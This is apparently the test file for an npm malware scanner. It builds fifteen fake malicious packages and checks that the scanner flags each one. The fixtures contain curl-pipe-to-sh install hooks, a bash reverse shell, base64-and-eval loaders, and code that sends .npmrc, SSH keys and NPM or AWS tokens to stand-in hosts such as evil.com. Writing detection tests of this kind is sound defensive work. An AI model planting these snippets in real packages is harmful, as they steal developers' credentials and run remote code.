/**
 * MUAD'DIB Adversarial Detection Tests
 * Creates fake malicious npm packages in temp directories,
 * runs muaddib scan, and verifies threats are detected.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

const BIN = path.join(__dirname, '..', 'bin', 'muaddib.js');

let passed = 0;
let failed = 0;
const failures = [];
const results = [];

function test(name, fn) {
  try {
    fn();
    console.log(`[PASS] ${name}`);
    passed++;
    results.push({ name, detected: true });
  } catch (e) {
    console.log(`[FAIL] ${name}`);
    console.log(`       ${e.message}`);
    failures.push({ name, error: e.message });
    failed++;
    results.push({ name, detected: false, error: e.message });
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message || 'Assertion failed');
}

function makeTempDir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), `muaddib-adv-${prefix}-`));
}

function cleanDir(dir) {
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
}

/**
 * Run muaddib scan on a directory and return the full output.
 * Never throws — returns combined stdout+stderr on non-zero exit.
 */
function scan(targetDir, extraFlags) {
  const flags = extraFlags || '';
  try {
    return execSync(`node "${BIN}" scan "${targetDir}" ${flags}`, {
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe'],
      timeout: 30000
    });
  } catch (e) {
    return (e.stdout || '') + (e.stderr || '');
  }
}

/**
 * Assert that the scan output contains at least one of the given keywords,
 * proving that a threat was detected.
 */
function assertDetected(output, keywords, scenario) {
  const lower = output.toLowerCase();
  const found = keywords.some(k => lower.includes(k.toLowerCase()));
  if (!found) {
    throw new Error(
      `No threat detected for "${scenario}".\n` +
      `  Looked for: ${keywords.join(', ')}\n` +
      `  Output (first 500 chars): ${output.slice(0, 500)}`
    );
  }
}

// ============================================================
console.log('='.repeat(60));
console.log('  MUAD\'DIB ADVERSARIAL DETECTION TESTS');
console.log('  15 malicious package scenarios');
console.log('='.repeat(60));
console.log('');

// ----------------------------------------------------------
// SCENARIO 1: postinstall with curl piped to sh
// Expected detectors: scanPackageJson (lifecycle_script + curl_pipe_sh)
// ----------------------------------------------------------
test('SCENARIO 1: postinstall curl | sh', () => {
  const dir = makeTempDir('s01');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-01',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl http://attacker.com/payload.sh | sh'
      }
    }));
    const output = scan(dir);
    assertDetected(output, ['lifecycle_script', 'curl_pipe_sh', 'postinstall'], 'curl|sh in postinstall');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 2: preinstall with reverse shell via bash -i
// Expected detectors: scanPackageJson (lifecycle_script)
// ----------------------------------------------------------
test('SCENARIO 2: preinstall reverse shell bash -i', () => {
  const dir = makeTempDir('s02');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-02',
      version: '1.0.0',
      scripts: {
        preinstall: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
      }
    }));
    // Also add a .sh file for the shell scanner
    fs.writeFileSync(path.join(dir, 'setup.sh'),
      '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n');
    const output = scan(dir);
    assertDetected(output, ['lifecycle_script', 'reverse_shell', 'preinstall'], 'reverse shell in preinstall');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 3: require('child_process').exec with base64 obfuscated command
// Expected detectors: AST (dangerous_call_eval), package.json (base64_encoding)
// ----------------------------------------------------------
test('SCENARIO 3: child_process.exec + base64 + eval', () => {
  const dir = makeTempDir('s03');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-03',
      version: '1.0.0',
      scripts: {
        postinstall: 'node index.js'
      }
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const { exec } = require('child_process');
const cmd = Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2g=', 'base64').toString();
eval(cmd);
exec(cmd);
`);
    const output = scan(dir);
    assertDetected(output, ['eval', 'dangerous_call', 'lifecycle_script', 'base64'], 'child_process + base64 + eval');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 4: fs.readFileSync credential file + fetch exfiltration
// Expected detectors: AST (sensitive_string .env), dataflow (credential_read + network_send)
// ----------------------------------------------------------
test('SCENARIO 4: readFileSync credential + fetch exfiltration', () => {
  const dir = makeTempDir('s04');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-04', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const fs = require('fs');
const data = fs.readFileSync('/etc/passwd', 'utf8');
const secrets = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');
fetch('http://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify({ passwd: data, npmrc: secrets })
});
`);
    const output = scan(dir);
    assertDetected(output, ['.npmrc', 'sensitive_string', 'suspicious_dataflow', 'credential'], 'readFile + fetch exfiltration');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 5: process.env.NPM_TOKEN exfiltrated via HTTP
// Expected detectors: AST (env_access NPM_TOKEN), dataflow (env_read + network_send)
// ----------------------------------------------------------
test('SCENARIO 5: process.env.NPM_TOKEN exfiltration', () => {
  const dir = makeTempDir('s05');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-05', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const token = process.env.NPM_TOKEN;
const secret = process.env.AWS_SECRET_ACCESS_KEY;
fetch('http://evil.com/steal?t=' + token + '&s=' + secret);
`);
    const output = scan(dir);
    assertDetected(output, ['NPM_TOKEN', 'AWS_SECRET', 'env_access', 'dataflow'], 'env token exfiltration');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 6: eval() with dynamically concatenated string
// Expected detectors: AST (dangerous_call_eval)
// ----------------------------------------------------------
test('SCENARIO 6: eval() with dynamic concatenation', () => {
  const dir = makeTempDir('s06');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-06', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const a = 'req';
const b = 'uire';
const c = "('child_" + "process')";
eval(a + b + c);
`);
    const output = scan(dir);
    assertDetected(output, ['eval', 'dangerous_call'], 'eval with concatenation');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 7: Buffer.from base64 decoded then eval
// Expected detectors: AST (dangerous_call_eval)
// ----------------------------------------------------------
test('SCENARIO 7: Buffer.from base64 + eval', () => {
  const dir = makeTempDir('s07');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-07', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const payload = Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3doYW1pJyk=', 'base64');
eval(payload.toString());
const fn = new Function(payload.toString());
fn();
`);
    const output = scan(dir);
    assertDetected(output, ['eval', 'Function', 'dangerous_call'], 'Buffer base64 + eval/Function');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 8: dns.lookup used to exfiltrate data
// Expected detectors: AST (env_access on SECRET), dataflow if combined
// ----------------------------------------------------------
test('SCENARIO 8: dns.lookup data exfiltration via env', () => {
  const dir = makeTempDir('s08');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-08', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const dns = require('dns');
const secret = process.env.SECRET_KEY;
const encoded = Buffer.from(secret).toString('hex');
dns.lookup(encoded + '.attacker.com', () => {});
fetch('http://attacker.com/ping');
`);
    const output = scan(dir);
    assertDetected(output, ['SECRET', 'env_access', 'dataflow'], 'dns exfiltration with env access');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 9: Typosquatting — "lodahs" (close to "lodash")
// Expected detectors: scanTyposquatting (typosquat_detected)
// ----------------------------------------------------------
test('SCENARIO 9: Typosquatting "lodahs" (lodash)', () => {
  const dir = makeTempDir('s09');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'my-project',
      version: '1.0.0',
      dependencies: {
        'lodahs': '^4.17.21',
        'axois': '^1.6.0',
        'expres': '^4.18.0'
      }
    }));
    const output = scan(dir);
    assertDetected(output, ['typosquat', 'lodash', 'axios', 'express', 'lodahs', 'axois', 'expres'], 'typosquatting detection');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 10: .npmrc read and sent to external server
// Expected detectors: AST (sensitive_string .npmrc), dataflow (credential_read + network_send)
// ----------------------------------------------------------
test('SCENARIO 10: .npmrc read + network exfiltration', () => {
  const dir = makeTempDir('s10');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-10', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const fs = require('fs');
const os = require('os');
const path = require('path');
const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
const http = require('http');
const req = http.request('http://evil.com/steal', { method: 'POST' });
req.write(npmrc);
req.end();
`);
    const output = scan(dir);
    assertDetected(output, ['.npmrc', 'sensitive_string', 'credential', 'dataflow'], '.npmrc exfiltration');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 11: SSH private key ~/.ssh/id_rsa read
// Expected detectors: AST (sensitive_string .ssh), dataflow (credential_read)
// ----------------------------------------------------------
test('SCENARIO 11: SSH key ~/.ssh/id_rsa read + exfiltration', () => {
  const dir = makeTempDir('s11');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-11', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const fs = require('fs');
const sshKey = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
fetch('http://evil.com/keys', {
  method: 'POST',
  body: sshKey
});
`);
    const output = scan(dir);
    assertDetected(output, ['.ssh', 'sensitive_string', 'credential', 'dataflow'], 'SSH key exfiltration');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 12: Obfuscation — _0x variables + hex encoding
// Expected detectors: detectObfuscation (obfuscation_detected)
// ----------------------------------------------------------
test('SCENARIO 12: Obfuscated code with _0x vars + hex escapes', () => {
  const dir = makeTempDir('s12');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-12', version: '1.0.0'
    }));
    // Generate obfuscated-looking code with _0x variables and hex escapes
    const lines = [];
    lines.push('// Obfuscated malware');
    for (let i = 0; i < 10; i++) {
      lines.push(`var _0x${i.toString(16).padStart(4, '0')} = "\\x48\\x65\\x6C\\x6C\\x6F\\x57\\x6F\\x72\\x6C\\x64";`);
    }
    lines.push('var _0xfeed = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";');
    lines.push('var _0xbeef = "\\x63\\x68\\x69\\x6C\\x64\\x5F\\x70\\x72\\x6F\\x63\\x65\\x73\\x73";');
    // Add massive hex escapes to boost score
    lines.push('var _0xdead = "' + '\\x41'.repeat(30) + '";');
    fs.writeFileSync(path.join(dir, 'index.js'), lines.join('\n'));
    const output = scan(dir);
    assertDetected(output, ['obfuscat', 'hex_escape', 'obfuscated_variable'], 'obfuscation detection');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 13: Webhook to suspicious domain in postinstall
// Expected detectors: scanPackageJson (lifecycle_script + base64/eval patterns)
// ----------------------------------------------------------
test('SCENARIO 13: Suspicious webhook in postinstall', () => {
  const dir = makeTempDir('s13');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-13',
      version: '1.0.0',
      scripts: {
        postinstall: 'node -e "require(\'child_process\').exec(\'curl -X POST -d @~/.npmrc http://evil-webhook.attacker.com/hook\')"'
      }
    }));
    const output = scan(dir);
    assertDetected(output, ['lifecycle_script', 'postinstall', 'child_process', '.npmrc'], 'webhook in postinstall');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 14: Script that modifies another package's package.json
// Expected detectors: AST (sensitive_string .npmrc via combined attack)
// ----------------------------------------------------------
test('SCENARIO 14: Script modifying another package.json + stealing creds', () => {
  const dir = makeTempDir('s14');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-14', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
const fs = require('fs');
const path = require('path');

// Read .npmrc to steal credentials
const npmrc = fs.readFileSync('.npmrc', 'utf8');

// Tamper with another package
const targetPkg = path.join(__dirname, '..', 'other-package', 'package.json');
const pkg = JSON.parse(fs.readFileSync(targetPkg, 'utf8'));
pkg.scripts = pkg.scripts || {};
pkg.scripts.postinstall = 'curl http://evil.com/backdoor | sh';
fs.writeFileSync(targetPkg, JSON.stringify(pkg, null, 2));

// Exfiltrate
fetch('http://evil.com/data', { method: 'POST', body: npmrc });
`);
    const output = scan(dir);
    assertDetected(output, ['.npmrc', 'sensitive_string', 'credential', 'dataflow'], 'package tampering + credential theft');
  } finally {
    cleanDir(dir);
  }
});

// ----------------------------------------------------------
// SCENARIO 15: Prototype pollution via __proto__
// Expected detectors: AST (dangerous_call_eval via eval-based pollution)
// ----------------------------------------------------------
test('SCENARIO 15: Prototype pollution + eval payload', () => {
  const dir = makeTempDir('s15');
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'evil-pkg-15', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(dir, 'index.js'), `
// Prototype pollution attack
const payload = '{"__proto__": {"polluted": true, "command": "curl http://evil.com/pwn | sh"}}';
const obj = JSON.parse(payload);

// Use eval to execute the polluted command
if (obj.command) {
  eval(obj.command);
}

// Alternative: new Function
const fn = new Function('return ' + obj.command);
fn();
`);
    const output = scan(dir);
    assertDetected(output, ['eval', 'Function', 'dangerous_call'], 'prototype pollution + eval');
  } finally {
    cleanDir(dir);
  }
});

// ============================================================
// RESULTS
// ============================================================
console.log('\n' + '='.repeat(60));
console.log(`  DETECTION RATE: ${passed}/${passed + failed} scenarios detected`);
console.log(`  ${passed} passed, ${failed} failed`);
console.log('='.repeat(60));

if (failures.length > 0) {
  console.log('\nUndetected scenarios (detection gaps):');
  for (const f of failures) {
    console.log(`  [MISS] ${f.name}`);
    console.log(`         ${f.error.split('\n')[0]}`);
  }
}

console.log('\nDetailed results:');
for (const r of results) {
  const icon = r.detected ? '+' : '-';
  console.log(`  [${icon}] ${r.name}`);
}

console.log('');
process.exit(failed > 0 ? 1 : 0);
